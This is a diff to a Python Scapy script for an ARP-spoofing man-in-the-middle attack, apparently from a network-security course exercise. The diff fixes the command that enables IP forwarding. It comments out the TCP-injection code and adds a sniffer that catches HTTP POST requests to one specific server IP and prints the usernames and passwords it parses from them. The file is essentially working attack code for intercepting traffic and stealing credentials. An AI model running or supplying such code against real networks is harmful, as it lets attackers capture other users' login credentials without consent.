@@ -44,7 +44,7 @@ def scan_net(ip):
 
 
 def arp():
-	os.system("sudo sysctl -w net.ipv4.ip_forward"+str(1))
+	os.system("sudo sysctl -w net.ipv4.ip_forward="+str(1))
 	attacker_ip, attacker_mac = attacker()
 
 	scan_net(attacker_ip)
@@ -90,15 +90,26 @@ def arp():
 # 		spoof_ap_pkt = Ether(src=attacker_mac,dst=ap_mac)/ARP(psrc=vic_ip,pdst=ap_ip,hwsrc=attacker_mac,op=2)
 # 		sendp(spoof_ap_pkt)
 
+def show_http_pkt(packet):
+	if packet.haslayer(HTTPRequest):
+		method = packet[HTTPRequest].Method.decode()
+		if(packet[IP].dst == "140.113.207.246"  and packet.haslayer(Raw) and method == "POST"):
+			raw_data = packet[Raw].load
+			match = re.split(r'&', raw_data.decode())
+			usr_name = re.split(r'=', match[0])[1]
+			usr_pwd = re.split(r'=', match[1])[1]
+			print(usr_name,usr_pwd)
+
 
 def middle_man(attacker_ip):
-	s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
-	s.show()
-	dstport = s[0][TCP].sport
-	seqq = s[0][TCP].seq
-	result, un = sr(IP(src='140.113.207.246', dst=attacker_ip)/
-		TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
-	result.show()
+	# s = sniff(count=0, store=1, stop_filter = lambda x: x.haslayer(TCP), lfilter = lambda x: x.haslayer(TCP))
+	# s.show()
+	# dstport = s[0][TCP].sport
+	# seqq = s[0][TCP].seq
+	# result, un = sr(IP(src='140.113.207.246', dst=attacker_ip)/
+	# 	TCP(sport=80, dport=dstport, ack=seqq + 1, seq=300, flags='A'))
+	# result.show()
+	sniff(count=0, prn = show_http_pkt, filter="port 80")
 
 
 arp()
